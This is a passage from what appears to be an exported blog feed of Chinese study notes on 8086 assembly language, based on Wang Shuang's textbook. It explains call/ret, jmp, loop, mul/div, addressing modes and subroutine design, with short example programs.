    <content type="text"><![CDATA[call和ret指令都是转移指令，都可修改IP，或同时修改CS和IP，它们经常被共同用来实现子程序的设计 ret和retfret指令用栈中的数据，修改IP的内容，从而实现近转移 retf指令用栈中的数据，修改CS和IP的内容，从而实现远转移 ret指令操作： (IP)=((ss)*16+(sp)) (sp)=(sp)+2 retf指令操作： (IP)=((ss)*16+(sp)) (sp)=(sp)+2 (CS)=((ss)*16+(sp)) (sp)=(sp)+2 call指令call指令的两步操作： 将当前的IP或CS和IP压入栈中 转移 call指令不能实现短转移 依据位移进行转移的call指令格式：call 标号(将当前IP压栈后，转到标号处执行指令) call指令的操作： (sp)=(sp)-2 ((ss)*16+(sp))=(IP) (IP)=(IP)+16位位移 16位位移=标号处的地址-call指令后的第一个字节的地址 16位位移的范围-32768–32767，以补码表示 16位位移由编译程序在编译时算出 转移的目的地址在指令中的call指令格式：call far ptr 标号，实现段间转移 操作： (sp)=(sp)-2 ((ss)*16+(sp))=(CS) (sp)=(sp)-2 ((ss)*16+(sp))=(IP) (CS)=标号所在段的段地址 (IP)=标号在段中的偏移地址 转移地址在寄存器中的call指令格式：call 16位reg 操作： (sp)=(sp)-2 ((ss)*16+(sp))=(IP) (IP)=(16位reg) 转移地址在内存中的call指令格式： call word ptr 内存单元地址 操作： (sp)=(sp)-2 ((ss)*16+(sp))=(IP) (IP)=(内存单元地址) 相当于进行： 12push IPjmp word ptr 内存单元地址 123456mov sp,10hmov ax,0123hmov ds:[0],axcall word ptr ds:[0]执行后，(IP)=0123H,(sp)=0EH call dword ptr 内存单元地址 操作： (sp)=(sp)-2 ((ss)*16+(sp))=(CS) (sp)=(sp)-2 ((ss)*16+(sp))=(IP) (CS)=(内存单元地址+2) (IP)=(内存单元地址) 相当于进行： 123push CSpush IPjmp dword ptr 内存单元地址 1234567mov sp,10hmov ax,0123hmov ds:[0],axmov word ptr ds:[2],0call dword ptr ds:[0]执行后，(CS)=0,(IP)=0123h,(sp)=0Ch call和ret的配合使用使用call和ret实现子程序的机制 程序返回前，bx的值？123456789101112131415assume cs:codecode segmentstart: mov ax,1 mov cx,3 call s mov bx,ax mov ax,4c00h int 21hs: add ax,ax loop s retcode endsend start 分析： CPU将call s指令的机器码读入，此时IP指向call s后的指令mov bx,ax。CPU执行call s指令，将当前IP值(指令mov bx,ax的偏移地址)压栈，并将IP的值改变为标号s处的偏移地址 CPU从标号s处执行指令，loop循环完成后，(ax)=8 CPU将ret指令的机器码读入，此时IP指向ret指令后的内存单元。CPU执行ret指令，从栈中弹出一个值(即call s先前压入栈的mov bx,ax指令的偏移地址)送入IP中，则CS:IP指向指令mov bx,ax CPU从mov bx,ax开始执行指令，直至完成 结论可以写一个具有一定功能的程序段，称之为子程序 在需要执行子程序时，用call指令转去执行，此时，会将call指令后面的指令的地址存储在栈中。当子程序执行完成后，在子程序后面使用ret指令，用栈中的数据设置IP的值，从而转到call指令后面的代码处继续执行 子程序框架123456789101112131415161718192021assume cs:codecode segmentmain: ... call sub1 ;调用子程序sub1 ... mov ax,4c00h int 21h sub1: ... call sub2 ;调用子程序sub2 ... ret ;子程序返回 sub2: ... ret ;子程序返回 code endsend main mul指令乘法指令 注意： 两个乘数： 必须同为8位或同为16位 若为8位，一个默认放在al中，另一个放在8位reg或内存字节单元中 若为16位，一个默认放在ax中，另一个放在16位reg或内存字单元中 结果： 若为8位乘法，结果默认在ax中 若为16位乘法，结果高位默认在dx中存放，低位在ax中存放 格式： mul reg mul 内存单元 mul byte ptr ds:[0]，含义：(ax)=(al)*((ds)*16+0) mul word ptr [bx+si+8] 含义：(ax)=(ax)*((ds)*16+(bx)+(si)+8)结果的低16位，(dx)=(ax)*((ds)*16+(bx)+(si)+8)结果的高16位 例： 计算100*10 分析：100和10小于255，可做8位乘法 123mov al,100mov bl,10mul bl 结果：(ax)=1000(03E8H) 计算100*10000 分析：100小于255，但10000大于255，所以必须做16位乘法 123mov ax,100mov bx,10000mul bx 结果：(ax)=4240H,(dx)=000FH（F4240H=1000000） 模块化程序设计利用call和ret指令，可以用简捷的方法，实现多个互相联系、功能独立的子程序来解决一个复杂的问题 参数和结果传递的问题子程序一般都要根据提供的参数处理一定的事务，处理后，将结果(返回值)提供给调用者 讨论参数和返回值传递的问题，实际上就是在探讨，应该如何存储子程序需要的参数和产生的返回值 用寄存器来存储参数和结果是最常用的方法 对于存放参数的寄存器和存放结果的寄存器，调用者和子程序的读写操作相反：调用者将参数送入参数寄存器，从结果寄存器中取到返回值；子程序从参数寄存器中取到参数，将返回值送入结果寄存器 计算data段中第一组数据的3次方，结果保存到后一组dword单元中 12345678910111213141516171819202122232425262728293031assume cs:codedata segment dw 1,2,3,4,5,6,7,8 dd 0,0,0,0,0,0,0,0data endscode segmentstart: mov ax,data mov ds,ax mov si,0 ;ds:si指向第一组word单元 mov di,16 ;ds:di指向第二组dword单元 mov cx,8s: mov bx,[si] call cube ;调用子程序，进行3次方运算 mov [di],ax mov [di].2,dx add si,2 ;ds:si指向下一个word单元 add di,4 ;ds:di指向下一个dword单元 loop s mov ax,4c00h int 21h cube: mov ax,bx mul bx mul bx ret code endsend start 批量数据的传递当进行传递的数据过多时，寄存器的数量有限，不可能简单的用寄存器来存放多个需要传递的数据。对于返回值，也有同样的问题 可以使用内存空间，将批量数据放到内存中，然后将数据所在的内存空间的首地址放在寄存器中，传递给需要的子程序。对于具有批量数据的返回结果，也可使用同样的方法 编程，将字母字符串转换大写字母 123456789101112131415161718192021assume cs:codedata segment db &apos;conversation&apos;data endscode segmentstart: mov ax,data mov ds,ax mov si,0 ;ds:si指向字符串内存空间首地址 mov cx,12 call capital mov ax,4c00h int 21hcapital:and byte ptr [si],11011111b ;转换为大写字母 inc si ;ds:si指向下一个字母内存空间 loop capital retcode endsend start 寄存器冲突的问题编程，将一个全是字母，以0结尾的字符串，转换为大写 1234567891011121314151617181920212223242526272829303132assume cs:codedata segment db &apos;word&apos;,0 ;以0为结尾符的字符串定义 db &apos;unix&apos;,0 db &apos;wind&apos;,0 db &apos;good&apos;,0data endscode segmentstart: mov ax,data mov ds,ax mov bx,0 mov cx,4 ;4个字符串，循环4次s: mov si,bx call capital ;进入子程序 add bx,5 ;切换至下一个字符串 loop s ;循环4次 mov ax,4x00h int 21h capital:mov cl,[si] ;开始对字符串进行循环 mov ch,0 jcxz ok ;若(cx)=0，跳转ok。若不为0，继续向下执行 and byte ptr [si],11011111b ;字母转换大写 inc si ;指向下一个字母 jmp short capital ;转到capital处继续执行ok: ret ;子程序返回code endsend start 此程序中存在问题，在于cx，在主程序中使用了cx记录循环次数，可在子程序中也使用了cx，并且改变了cx的值，会使得主程序的循环出错 一般化问题：子程序中使用的寄存器，很可能在主程序中也要使用，造成了寄存器使用上的冲突 设想： 编写要调用子程序的程序的时候不必关心子程序到底使用了哪些寄存器 编写子程序的时候不必关心调用者使用了哪些寄存器 不会发生寄存器冲突 解决方案：在子程序的开始将子程序中所用到的寄存器中的内容都保存起来，在子程序返回前再恢复。可以使用栈来保存寄存器中的内容 改进子程序capital： 12345678910111213capital:push cx push si change: mov cl,[si] mov ch,0 jcxz ok and byte ptr [si],11011111b inc si jmp short change ok: pop si pop cx ret 编写子程序的标准框架： 12345子程序开始: 子程序中使用的寄存器入栈 子程序内容 子程序中使用的寄存器出栈 返回(ret、retf) 编写子程序解决除法溢出的问题在使用div指令做除法的时候，会出现：结果的商过大，超出了寄存器所能存储的范围。这将引起CPU的一个内部错误，称为除法溢出 子程序描述名称：divdw 功能：进行不会产生溢出的除法运算，被除数为dword型，除数为word型，结果为dword型 参数： (ax)=dword型数据的低16位 (dx)=dword型数据的高16位 (cx)=除数 返回： (dx)=结果的高16位 (ax)=结果的低16位 (cx)=余数 提示公式： X/N=int(H/N)*65536+[rem(H/N)*65536+L]/N X：被除数，范围[0,FFFFFFFF] N：除数，范围[0,FFFF] H：X高16位，范围[0,FFFF] L：X低16位，范围[0,FFFF] int()：描述性运算符，取商 rem()：描述性运算符，取余数 此公式将可能产生溢出的除法运算X/N转变为多个不会产生溢出的除法运算 公式等号右边的所有除法运算都可以用div指令来做，肯定不会导致除法溢出]]></content>
      <categories>
        <category>汇编与逆向</category>
      </categories>
      <tags>
        <tag>8086汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[汇编语言(王爽)-转移指令的原理]]></title>
    <url>%2F2019%2F03%2F29%2F%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-%E7%8E%8B%E7%88%BD-%E8%BD%AC%E7%A7%BB%E6%8C%87%E4%BB%A4%E7%9A%84%E5%8E%9F%E7%90%86%2F</url>
    <content type="text"><![CDATA[可以修改IP,或同时修改CS和IP的指令统称为转移指令 转移指令就是可以控制CPU执行内存中某处代码的指令 8086CPU的转移行为分为： 只修改IP时，称为段内转移。如：jmp ax 同时修改CS和IP时，称为段间转移。如：jmp 1000:0 段内转移分为： 短转移，IP的修改范围为-128–127(字节) 近转移，IP的修改范围为-32768–32767(字节) 8086CPU的转移指令分为： 无条件转移指令(如：jmp) 条件转移指令 循环指令(如：loop) 过程 中断 操作符offset操作符offset在汇编语言中是由编译器处理的符号 功能：取得标号的偏移地址 123456assume cs:codesgcodesg segmentstart: mov ax,offset start ;相当于mov ax,0s: mov ax,offset s ;相当于mov ax,3codesg endsend start offset操作符取得了标号start和s的偏移地址0和3 mov ax,offset start相当于指令mov ax,0，因start是代码段中的标号，它所标记的指令是代码段中的第一条指令，偏移地址为0 mov ax,offset s相当于指令mov ax,3,因s是代码段中的标号，它所标记的指令是代码段中的第二条指令，第一条指令长度为3个字节，则s的偏移地址为3 jmp指令jmp为无条件转移指令，可以只修改IP，也可以同时修改CS和IP jmp指令要给出两种信息： 转移的目的地址 转移的距离(段间转移、段内短转移、段内近转移) 依据位移进行转移的jmp指令格式：jmp short 标号 功能：转到标号处执行指令 实现段内短转移，IP修改范围为向前转移最多128个字节，向后转移最多127个字节 short符号说明指令进行的是短转移 “标号”指明了指令要转移的目的地，转移指令结束后，CS:IP应指向标号处的指令 12345678assume cs:codesgcodesg segmentstart: mov ax,0 jmp short s add ax,1s: inc axcodesg endsend start 在一般的汇编指令中，汇编指令中的idata，不论是表示一个数据还是内存单元的偏移地址，都会在对应的机器指令中出现，因为CPU执行的是机器指令，它必须处理这些数据或地址 jmp short s所对应的机器码为EB03，说明CPU在执行jmp指令的时候并不需要转移的目的地址 CPU执行指令的过程 从CS:IP指向的内存单元读取指令，读取的指令进入指令缓冲器 (IP)=(IP)+所读取指令的长度，从而指向下一条指令 执行指令。转到1，重复这个过程 当CPU执行到机器指令EB03时，机器指令中未包含转移的目的地址，却告诉了CPU要转移的位移，重点在“03”上，它指将当前IP向后移动3个字节。当CPU执行EB03时，当前(IP)=0005H,执行EB03后，将当前IP值加3，使(IP)=0008H，从而实现转移 所以，在jmp short 标号指令所对应的机器码中，并不包含转移的目的地址，而包含的是转移的位移。 这个位移，是编译器根据汇编指令中的“标号”计算出来的 实际上，jmp short 标号的功能是：(IP)=(IP)+8位位移 8位位移=标号处的地址-jmp指令后的第一个字节的地址 short指明此处的位移为8位位移 8位位移的范围是-128–127，以补码表示 8位位移由编译程序在编译时算出 jmp near ptr 标号，实现段内近转移 jmp near ptr 标号的功能是：(IP)=(IP)+16位位移 16位位移=标号处的地址-jmp指令后的第一个字节的地址 near ptr指明此处的位移为16位位移，进行段内近转移 16位位移的范围是-32768–32767，以补码表示 16位位移由编译程序在编译时算出 转移的目的地址在指令中的jmp指令jmp far ptr 标号实现的是段间转移，又称远转移 (CS)=标号所在段的段地址 (IP)=标号在段中的偏移地址 far ptr表示指令用标号的段地址和偏移地址修改CS和IP 123456789101112assume cs:codesgcodesg segmentstart: mov ax,0 mov bx,0 jmp far ptr s db 256 dup (0)s: add ax,1 inc axcodesg endsend start jmp far ptr s所对应的机器码中，包含转移的目的地址 0B01BD0B是目的地址在指令中的存储顺序，高地址的BD0B是转移的段地址：0BBDH，低地址的0B01是偏移地址：010BH 转移地址在寄存器中的jmp指令指令格式：jmp 16位reg 功能：(IP)=(16位reg) 转移地址在内存中的jmp指令转移地址在内存中的jmp指令有两种格式： jmp word ptr 内存单元地址(段内转移) 功能：从内存单元地址处开始存放着一个字，是转移的目的偏移地址 12345mov ax,0123Hmov [bx],axjmp word ptr [bx]执行后，(IP)=0123H jmp dword ptr 内存单元地址(段间转移) 功能：从内存单元地址处开始存放着两个字，高地址处的字是转移的目的段地址，低地址处是转移的目的偏移地址 (CS)=(内存单元地址+2) (IP)=(内存单元地址) 123456mov ax,0123Hmov ds:[0],axmov word ptr ds:[2],0jmp dword ptr ds:[0]执行后，(CS)=0，(IP)=0123H，CS:IP指向0000:0123 jcxz指令有条件转移指令 所有的有条件转移指令都是短转移，在对应的机器码中包含转移的位移，而不是目的地址，对IP的修改范围都为：-128–127 指令格式：jcxz 标号 条件：如果(cx)=0,转移到标号处执行 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果(cx)&ne;0，什么也不做，程序向下执行 操作：当(cx)=0时，(IP)=(IP)+8位位移 8位位移=标号处的地址-jcxz指令后的第一个字节的地址 8位位移的范围为-128–127，以补码表示 8位位移由编译程序在编译时算出 loop指令循环指令 所有的循环指令都是短转移，在对应的机器码中包含转移的位移，而不是目的地址，对IP的修改范围为-128–127 指令格式：loop 标号 操作： (cx)=(cx)-1 若(cx)&ne;0，(IP)=(IP)+8位位移，转移到标号处执行 若(cx)=0，什么也不做，程序向下执行 8位位移=标号处的地址-loop指令后的第一个字节的地址 8位位移的范围为-128–127，以补码表示 8位位移由编译程序在编译时算出 根据位移进行转移的意义jmp short 标号 jmp near ptr 标号 jcxz 标号 loop 标号 等几种汇编指令，对IP的修改是根据转移目的地址和转移起始地址之间的位移来进行的。它们对应的机器码中不包含转移的目的地址，而包含的是到目的地址的位移 这种设计，方便了程序段在内存中的浮动装配 这种程序装在内存中的不同位置都可正确执行，只涉及位移，而不涉及目的地址，目的地址根据装载内存位置不同会出现偏差，而转移位移是不变的 编译器对转移位移超界的检测根据位移进行转移的指令，它们的转移范围受转移位移的限制，如果在源程序中出现了转移范围超界的问题，在编译的时候，编译器将报错 形如jmp 2000:0100的转移指令，可在Debug中使用，汇编编译器并不认识，如在源程序中使用，编译时也会报错 80*25彩色字符模式显示缓冲区结构显示缓冲区：内存空间B8000H-BFFFFH，共32KB空间 显示器一屏显示25行，每行80个字符，每个字符256种属性(背景、前景、闪烁、高亮等组合信息) 一个字符在显示缓冲区占两个字节的存储空间(一个字)，分别存放字符的ASCII码和属性，低位字节存储字符的ASCII码，高位字节存储字符的属性。一行共有80个字符，占160个字节 一屏内容在显示缓冲区占4000个字节，可用于显示的为2000个字节(25*80)，其他2000个字节为字符属性设置 显示缓冲区分为8页，每页4KB，通常显示第0页内容，即B8000H-B8F9FH中的4000个字节的内容将出现在显示器上 显示缓冲区中，偶地址存放字符，奇地址存放字符的颜色属性 属性字节的格式：]]></content>
      <categories>
        <category>汇编与逆向</category>
      </categories>
      <tags>
        <tag>8086汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[汇编语言(王爽)-数据处理的两个基本问题]]></title>
    <url>%2F2019%2F03%2F28%2F%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-%E7%8E%8B%E7%88%BD-%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E7%9A%84%E4%B8%A4%E4%B8%AA%E5%9F%BA%E6%9C%AC%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[处理的数据在什么地方？ 要处理的数据有多长？ 这两个问题，在机器指令中必须给以明确或隐含的说明，否则计算机无法进行工作 定义描述性符号：reg和sreg reg表示一个寄存器，包括：ax、bx、cx、dx、ah、al、bh、bl、ch、cl、dh、dl、sp、bp、si、di sreg表示一个段寄存器，包括：ds、ss、cs、es bx、si、di和bp 在8086CPU中，只用这4个寄存器可以用在[ ]中来进行内存单元的寻址 在[ ]中，这4个寄存器可以单个出现，或只以4种组合出现 bx和si bx和di bp和si bp和di 只要在[ ]中使用寄存器bp，而指令中没有显性给出段地址，段地址就默认在ss中 机器指令处理的数据在什么地方绝大部分机器指令都是进行数据处理的指令，处理大致分为3类：读取、写入、运算 指令在执行前，所要处理的数据可以在3个地方：CPU内部、内存、端口 汇编语言中数据位置的表达 立即数(idata) 对于直接包含在机器指令中的数据(执行前在CPU的指令缓冲器)称为立即数，在汇编指令中直接给出 寄存器 指令要处理的数据在寄存器中，在汇编指令中给出相应的寄存器名 段地址(SA)和偏移地址(EA) 指令要处理的数据在内存中，在汇编指令中可用 [ ]的格式给出EA，SA在某个段寄存器中 存放段地址的寄存器默认在ds或ss中，也可以显性给出 寻址方式当数据存放在内存中时，可以使用多种方式给定内存单元的偏移地址，这种定位内存单元的方法一般称为寻址方式 指令要处理的数据有多长8086CPU的指令，可以处理两种尺寸的数据，byte和word 在机器指令中要指明，指令进行的是字操作还是字节操作 通过寄存器指明要处理的数据的尺寸 使用ax等寄存器时，表示进行的是字操作 在没有寄存器名存在的情况下，用操作符X ptr指明内存单元的长度，X在汇编指令中可以是word或byte 用word ptr指明了指令访问的内存单元是一个字单元 mov word ptr ds:[0],1 inc word ptr [bx] inc word ptr ds:[0] add word ptr [bx],2 用byte ptr指明了指令访问的内存单元是一个字节单元 mov byte ptr ds:[0],1 inc byte ptr [bx] inc byte ptr ds:[0] add byte ptr [bx],2 在没有寄存器参与的内存单元访问指令中，用word ptr或byte ptr显性的指明所要访问的内存单元的长度是很必要的。否则，CPU无法得知所要访问的单元是字单元，还是字节单元 其他方法 有些指令默认了访问的是字单元还是字节单元。如：push指令只进行字操作 寻址方式的综合应用记录更改原纪录： 123456789公司名称：DEC总裁姓名：Ken Olsen排名：137收入：40著名产品：PDP 新记录： 123456789公司名称：DEC总裁姓名：Ken Olsen排名：38收入：110著名产品：VAX 汇编程序 12345678910111213mov ax,segmov ds,axmov bx,60hmov word ptr [bx+0ch],38add word ptr [bx+0eh],70mov si,0mov byte ptr [bx+10h+si],&apos;V&apos;inc simov byte ptr [bx+10h+si],&apos;A&apos;inc simov byte ptr [bx+10h+si],&apos;X&apos; 用bx定位整个结构体，用idata定位结构体中的某一个数据项，用si定位数组项中的每个元素。为此，汇编语言提供了更为贴切的书写方式：[bx].idata、[bx].idata[si] div指令div是除法指令 除数：有8位和16位两种，在一个reg或内存单元中 被除数：默认放在ax或dx和ax中 若除数为8位，被除数则为16位，默认在ax中存放 若除数为16位，被除数则为32位，则在dx和ax中存放，dx存放高16位，ax存放低16位 结果： 若除数为8位，则al存储除法操作的商，ah存储除法操作的余数 若除数为16位，则ax存储除法操作的商，dx存储除法操作的余数 格式：div reg、div 内存单元 例： 1234div byte ptr ds:[0](al)=(ax)/((ds)*16+0)的商(ah)=(ax)/((ds)*16+0)的余数 除数存储在ds:[0]中，除数8位，则被除数16位，存储在ax中；al存储除法操作的商，ah存储除法操作的余数 1234div word ptr es:[0](ax)=[(dx)*10000H+(ax)]/((es)*16+0)的商(dx)=[(dx)*10000H+(ax)]/((es)*16+0)的余数 除数存储在es:[0]中，除数16位，被除数32位，dx存放被除数高16位，ax存放被除数低16位；ax存储除法操作的商，dx存储除法操作的余数 1234div byte ptr [bx+si+8](al)=(ax)/((ds)*16+(bx)+(si)+8)的商(ah)=(ax)/((ds)*16+(bx)+(si)+8)的余数 1234div word ptr [bx+si+8](ax)=[(dx)*10000H+(ax)]/((ds)*16+(bx)+(si)+8)的商(dx)=[(dx)*10000H+(ax)]/((ds)*16+(bx)+(si)+8)的余数 编程实现计算100001/100分析： 被除数100001大于65535(多于16位)，不能使用ax寄存器存放，使用dx和ax一起存放 除数100小于255，可以使用一个8位寄存器存放。但因被除数是32位的，除数应为16位，所以应使用一个16位寄存器来存放除数100 1234mov dx,1 ;对dx赋值被除数高16位mov ax,86A1H ;对ax赋值被除数低16位 (dx)*10000H+(ax)=100001mov bx,100 ;赋值除数到bx寄存器中div bx 伪指令dddb用来定义字节型数据 dw用来定义字型数据 dd用来定义dword(double word双字)型数据 编程实现，第一个数据除以第二个数据，结果存在第三个数据的存储单元中12345data segment dd 100001 dw 100 dw 0data ends 分析：dd定义第一个数据，为双字型数据，32位，将第一个数据存储在dx和ax中 123456mov ax,datamov ds,axmov ax,ds:[0] ;被除数低16位存储在ax中mov dx,ds:[2] ;被除数高16位存储在dx中div word ptr ds:[4]mov ds:[6],ax ;除法完成后，默认商存储在ax中，将商转存至第三个数据存储空间中 dup由编译器识别处理的操作符 同db、dw、dd等数据定义伪指令配合使用，用来进行数据的重复 格式： db 重复的次数 dup (重复的字节型数据) dw 重复的次数 dup (重复的字型数据) dd 重复的次数 dup (重复的双字型数据) 例： db 3 dup (0) 定义3个字节，值为0，相当于db 0,0,0 db 3 dup (0,1,2) 定义9个字节，值为0、1、2、0、1、2、0、1、2，相当于db 0,1,2,0,1,2,0,1,2 db 3 dup (&#39;abc&#39;,&#39;ABC&#39;) 定义了18个字节，值是abcABCabcABCabcABC,相当于db &#39;abcABCabcABCabcABC&#39; 当定义大容量的数据段或者栈段时，使用dup可以使程序简短 定义一个200个字节的栈段 123stack segment db 200 dup (0)stack ends]]></content>
      <categories>
        <category>汇编与逆向</category>
      </categories>
      <tags>
        <tag>8086汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[汇编语言(王爽)-更灵活的定位内存地址的方法]]></title>
    <url>%2F2019%2F03%2F26%2F%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-%E7%8E%8B%E7%88%BD-%E6%9B%B4%E7%81%B5%E6%B4%BB%E7%9A%84%E5%AE%9A%E4%BD%8D%E5%86%85%E5%AD%98%E5%9C%B0%E5%9D%80%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[and和or指令and指令逻辑与指令，按位进行与运算 0为假，1为真 双方为真，才为真 通过该指令可将操作对象的相应位设为0，其他位不变 or指令逻辑或指令，按位进行或运算 一方为真，即为真 通过该指令可将操作对象的相应位设为1，其他位不变 关于ASCII码所谓编码方案，就是一套规则，它约定了用什么样的信息来表示现实对象 将人能理解的信息存储在计算机中，要对其进行编码，将其转换为二进制信息进行存储。而计算机要将这些存储的信息再显示给人看，就要再对其进行解码。只要编码和解码采用相同的规则，就可以将人能理解的信息存入计算机，再从计算机中取出 以字符形式给出的数据汇编语言中，用&#39; &#39;的方式指明数据是以字符的形式给出的，编译器将它们转化为对应的ASCII码 如： db &#39;unIX&#39;相当于db 75H,6EH,49H,58H。 mov al,&#39;a&#39;相当于mov al,61H 大小写转换问题将BaSiC转换为全大写，将iNfOrMaTiOn转换为全小写 小写字母的ASCII码值比大写字母的ASCII码值大20H 以ASCII码的二进制形式来看，除第5位外，大写字母与小写字母的其他各位都一样。大写字母ASCII码第5位为0，小写字母ASCII码第5位为1 新方法，一个字母，不管它原来是大写或者小写，将它第5位置0，将变为大写字母；将它的第5位置1，将变为小写字母，则不需要在处理前判断字母的大小写 1234567891011121314151617181920212223242526272829assume cs:codesg,ds:datasgdatasg segment db &apos;BaSiC&apos; db &apos;iNfOrMaTiOn&apos;datasg endscodesg segmentstart: mov ax,datasg mov ds,ax mov bx,0 mov cx,5 ;5个字母，循环5次s: mov al,[bx] and al,11011111B ;and指令，将ASCII码第5位置0，变为大写字母 mov [bx],al ;将变换后的ASCII码写回原内存单元 inc bx loop s mov bx,5 ;设置ds:bx指向&apos;iNfOrMaTiOn&apos;第一个字母 mov cx,11 ;11个字母，循环11次s0: mov al,[bx] or al,00100000B ;or指令，将ASCII码第5位置为1，变为小写字母 mov [bx],al ;将变换后的ASCII码写回原内存单元 inc bx loop s0 mov ax,4c00h int 21hcodesg endsend start [bx+idata][bx+idata]表示一个内存单元，它的偏移地址为(bx)+idata 指令mov ax,[bx+200]含义： 将一个字单元的内存单元内容送入ax，段地址在ds中，偏移地址为bx中的数值加200 数学化描述为：(ax)=((ds)*16+(bx)+200) 该指令常用格式： mov ax,[200+bx] mov ax,200[bx] mov ax,[bx].200 用[bx+idata]的方式进行数组的处理将第一个字符串转换为大写，将第二个字符串转换为小写 将两个字符串看作是两个数组，一个从0地址开始存放，另一个从5开始存放，可以用[0+bx]和[5+bx]的方式在同一个循环中定位这两个字符串中的字符 12345678910111213141516171819202122assume cs:codesg,ds:datasgdatasg segment db &apos;BaSiC&apos; db &apos;MinIX&apos;datasg endscodesg segmentstart: mov ax,datasg mov ds,ax mov bx,0 mov cx,5s: mov al,[bx] ;定位第一个字符串中的字符 and al,11011111b mov [bx],al mov al,[5+bx] ;定位第二个字符串中的字符 or al,00100000b mov [5+bx],al inc bx loop scodesg endsend start SI和DISI和DI是8086CPU中和bx功能相近的寄存器 SI和DI不能分成两个8位的寄存器来使用 用SI和DI实现将字符串welcome to masm!复制到它后面的数据区中 1234567891011121314151617181920212223assume cs:codesg,ds:datasgdatasg segment db &apos;welcome to masm!&apos; db &apos;................&apos;datasg endscodesg segment start: mov ax,datasg mov ds,ax mov si,0 ;ds:si指向原始字符串 mov di,16 ;ds:di指向目的空间 mov cx,8 ;用16位寄存器进行内存单元之间的数据传送，一次复制2个字节，共循环8次s: mov ax,[si] mov [di],ax add si,2 ;一次复制2个字节，所以一次循环后加2 add di,2 loop s mov ax,4c00h int 21hcodesg endsend start 使用[bx(si或di)+idata]方式，使程序更简洁 123456789101112131415codesg segment start: mov ax,datasg mov ds,ax mov si,0 mov cx,8s: mov ax,0[si] mov 16[si],ax add si,2 loop s mov ax,4c00h int 21hcodesg endsend start [bx+si]和[bx+di][bx+si]和[bx+di]的含义相似 [bx+si]表示一个内存单元，偏移地址为(bx)+(si) 指令mov ax,[bx+si]含义： 将一个字单元的内存单元的内容送入ax，段地址在ds中，偏移地址为bx中的值加上si中的值 数学化的描述为：(ax)=((ds)*16+(bx)+(si)) 该指令常用格式： mov ax,[bx][si] [bx+si+idata]和[bx+di+idata][bx+si+idata]和[bx+di+idata]的含义相似 [bx+si+idata]表示一个内存单元，偏移地址为(bx)+(si)+idata 指令mov ax,[bx+si+idata]含义： 将一个字单元的内存单元的内容送入ax，段地址在ds中，偏移地址为bx中的数值加上si中的数值再加上idata 数学化的描述为：(ax)=((ds)*16+(bx)+(si)+idata) 该指令常用格式： mov ax,[bx+200+si] mov ax,[200+bx+si] mov ax,200[bx][si] mov ax,[bx].200[si] mov ax,[bx][si].200 不同的寻址方式的灵活应用 [idata]用一个常量来表示地址，可用于直接定位一个内存单元 [bx]用一个变量来表示内存地址，可用于间接定位一个内存单元 [bx+idata]用一个变量和常量表示地址，可在一个起始地址的基础上用变量间接定位一个内存单元 [bx+si]用两个变量表示地址 [bx+si+idata]用两个变量和一个常量表示地址 将每个单词的首字母改为大写字母1234567891011121314151617181920212223assume cs:codesg,ds:datasgdatasg segment db &apos;1. file &apos; ;定义字符串长度为16个字节 db &apos;2. edit &apos; db &apos;3. search &apos; db &apos;4. view &apos; db &apos;5. options &apos; db &apos;6. help &apos;datasg endscodesg segmentstart: mov ax,datasg mov ds,ax mov bx,0 mov cx,6s: mov al,[bx+3] and al,11011111b mov [bx+3],al add bx,16 loop scodesg endsend start 将每个单词改为大写字母123456789101112131415161718192021222324252627282930313233343536373839assume cs:codesg,ds:datasg,ss:stacksgdatasg segment db &apos;ibm &apos; ;定义字符串长度为16个字节 db &apos;dec &apos; db &apos;dos &apos; db &apos;vax &apos;datasg endsstacksg segment ;定义一个栈段，容量为16个字节 dw 0,0,0,0,0,0,0,0stacksg endscodesg segmentstart: mov ax,stacksg mov ss,ax mov sp,16 mov ax,datasg mov ds,ax mov bx,0 mov cx,4s0: push cx ;外循环cx入栈，保存外循环次数 mov si,0 mov cx,3 ;开始内循环 s: mov al,[bx+si] and al,11011111b ;对行内每列字母转换大写 mov [bx+si],al ;转换完成后写回原内存单元 inc si loop s add bx,16 ;切换到第二行继续转换 pop cx ;外循环cx出栈，继续外循环 loop s0 mov ax,4c00h int 21hcodesg endsend start 当进行二重循环时，只有cx一个循环计数器，在进行内层循环时，会覆盖外层循环的循环计数值 无法多使用一个计数器，因为loop指令默认cx为循环计数器 使用寄存器来暂存cx中的值，但CPU中寄存器的数量是有限的，可用的寄存器有：dx、di、es、ss、sp、bp，若循环中程序比较复杂，这些寄存器可能也会被使用 使用内存单元来暂存cx中的值，但如果需要保存多个数据时，必须记住数据存放在哪个内存单元中，这样程序容易混乱 一般来说，在需要暂存数据的时候，我们都应该使用栈 将每个单词的前4个字母转换为大写字母12345678910111213141516171819202122232425262728293031323334353637383940414243assume cs:codesg,ss:stacksg,ds:datasgstacksg segment dw 0,0,0,0,0,0,0,0stacksg endsdatasg segment db &apos;1. display &apos; db &apos;2. brows &apos; db &apos;3. replace &apos; db &apos;4. modify &apos;datasg endscodesg segmentstart: mov ax,datasg mov ds,ax mov bx,0 ;定位行 mov ax,stacksg mov ss,ax mov sp,16 mov cx,4s0: push cx mov si,0 mov cx,4 s: mov al,[bx+si+3] and al,11011111b mov [bx+si+3],al inc si loop s add bx,16 pop cx loop s0 mov ax,4c00h int 21h codesg endsend start 用bx来作变量，定位每行的起始地址，用si定位要修改的列，用[bx+si+3]来对目标单元进行寻址]]></content>
      <categories>
        <category>汇编与逆向</category>
      </categories>
      <tags>
        <tag>8086汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[汇编语言(王爽)-包含多个段的程序]]></title>
    <url>%2F2019%2F03%2F26%2F%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-%E7%8E%8B%E7%88%BD-%E5%8C%85%E5%90%AB%E5%A4%9A%E4%B8%AA%E6%AE%B5%E7%9A%84%E7%A8%8B%E5%BA%8F%2F</url>
